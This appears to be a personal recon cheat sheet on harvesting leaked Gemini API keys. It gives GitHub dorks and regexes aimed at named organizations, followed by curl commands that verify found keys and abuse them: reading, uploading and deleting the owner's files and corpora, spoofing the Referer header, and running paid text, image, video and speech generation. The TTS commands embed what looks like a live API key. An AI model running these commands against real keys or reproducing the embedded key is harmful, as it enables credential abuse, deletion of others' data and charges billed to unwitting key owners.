---
date: 2026-05-23T15:10:00
Type: Recon
tags:
  - Bugs/api
  - Recon/api
Key_Takeaway: Finding API Keys
Difficulty: Beginner
---
Go through this:
[Github Dorking](Github%20Dorking.md)

```
"GEMINI_API_KEY"
```
	-Same as above but to find Gemini api key.

```
/AIza[0-9A-Za-z_-]{35}/ 
/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY"
```
     -Regex to find Gemini API key

```
/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY" path:/.env
```
    -Path Filter for Environment Files

```
/AIza[0-9A-Za-z_-]{35}/ "GEMINI_API_KEY" path:/*.js 
/AIza[0-9A-Za-z_-]{35}/ path:/*.js
```
     -Path Filter for JavaScript Files

```
"netflix.com" /AIza[0-9A-Za-z_-]{35}/ 
org:microsoft /AIza[0-9A-Za-z_-]{35}/
```
     -Targeting Specific Organization and Domain Scoping

```
curl https://generativelanguage.googleapis.com/v1beta/models?key=YOUR_API_KEY 

https://generativelanguage.googleapis.com/v1beta/models?key=YOUR_API_KEY
```
    -Key Verification

```
curl https://generativelanguage.googleapis.com/v1beta/files?key=YOUR_KEY 

https://generativelanguage.googleapis.com/v1beta/files?key=YOUR_API_KEY
```
     -List Files

```
echo "Hello, this is a test file" > test.txt
 
curl -i \ -H "X-Goog-Upload-Protocol: multipart" \ -F 'metadata={"file":{"display_name":"coffin","mimeType":"text/plain"}};type=application/json' \ -F "file=@test.txt;type=text/plain" \ "https://generativelanguage.googleapis.com/upload/v1beta/files?key=YOUR_KEY"
```
     -Upload File

```
curl -X DELETE "https://generativelanguage.googleapis.com/v1beta/files/1d1j3cg1br3k?key=YOUR_API_KEY"
```
    -Delete File

```
curl -s -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY"
```
     -Referer Spoofing
     
```
curl -X POST \ -H "Content-Type: application/json" \ -H "Referer: https://www.google.com/" \ "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY" \ -d '{"display_name": "your_project_name"}'
```
     -Corpora Endpoint Abuse

```
curl -X DELETE -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora/CORPUS_ID?key=YOUR_API_KEY"
```
     -Deleting a Corpus

### Content Generation Abuse
```
curl -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent" \ -H "x-goog-api-key: YOUR_API_KEY" \ -H "Content-Type: application/json" \ -d '{"contents":[{"parts":[{"text":"Explain how AI works in a few words"}]}]}'
```
     -Text Generation

```
curl -X POST "https://generativelanguage.googleapis.com/v1beta/models/imagen-4.0-generate-001:predict" \ -H "x-goog-api-key: YOUR_API_KEY" \ -H "Content-Type: application/json" \ -d '{"instances":[{"prompt":"Robot holding a red skateboard"}]}'
```
     -Image Generation

```
GEMINI_API_KEY=AIza BASE_URL="https://generativelanguage.googleapis.com/v1beta" operation_name=$(curl -s "$BASE_URL/models/veo-3.0-fast-generate-001:predictLongRunning" \ -H "x-goog-api-key: $GEMINI_API_KEY" \ -H "Content-Type: application/json" \ -X POST \ -d '{"instances":[{"prompt":"A cinematic 5-second shot of a lantern swaying gently."}]}' \ | jq -r .name) while true; do status=$(curl -s -H "x-goog-api-key: $GEMINI_API_KEY" "$BASE_URL/$operation_name") doneval=$(echo "$status" | jq -r .done) if [ "$doneval" = "true" ]; then video_uri=$(echo "$status" | jq -r '.response.generateVideoResponse.generatedSamples[0].video.uri') curl -L -H "x-goog-api-key: $GEMINI_API_KEY" -o Generated_Video.mp4 "$video_uri" break fi sleep 5 done
```
     -Video Generation

```
#TTS (Single Speaker) 
curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent" \ -H "x-goog-api-key: AIzaSyCKeWGwFJZCJTUroDeolExpOYOIq70igXg" \ -H "Content-Type: application/json" \ -d '{ "contents":[{"parts":[{"text":"Say cheerfully: Have a wonderful day!"}]}], "generationConfig":{ "responseModalities":["AUDIO"], "speechConfig":{ "voiceConfig":{ "prebuiltVoiceConfig":{"voiceName":"Kore"} } } } }' \ | jq -r '.candidates[0].content.parts[] | select(.inlineData) | .inlineData.data' \ | head -n1 | base64 --decode > out.pcm Convert output: ffmpeg -y -f s16le -ar 24000 -ac 1 -i out_multi.pcm out_multi.wav ffmpeg -y -i out_multi.wav out_multi.mp3
------------------------------------------------------------------------------------------------------------------- 
#TTS (Multi-Speaker) 
curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent" \ -H "x-goog-api-key: AIzaSyCKeWGwFJZCJTUroDeolExpOYOIq70igXg" \ -H "Content-Type: application/json" \ -d '{ "contents":[{"parts":[{"text":"Joe: Hows it going today Jane?\nJane: Not too bad, how about you?"}]}], "generationConfig":{ "responseModalities":["AUDIO"], "speechConfig":{ "multiSpeakerVoiceConfig":{ "speakerVoiceConfigs":[ { "speaker":"Joe", "voiceConfig":{"prebuiltVoiceConfig":{"voiceName":"Kore"}} }, { "speaker":"Jane", "voiceConfig":{"prebuiltVoiceConfig":{"voiceName":"Puck"}} } ] } } } }' \ | jq -r '.candidates[0].content.parts[] | select(.inlineData) | .inlineData.data' \ | head -n1 | base64 --decode > out_multi.pcm
```
     -Text-To-Speech Abuse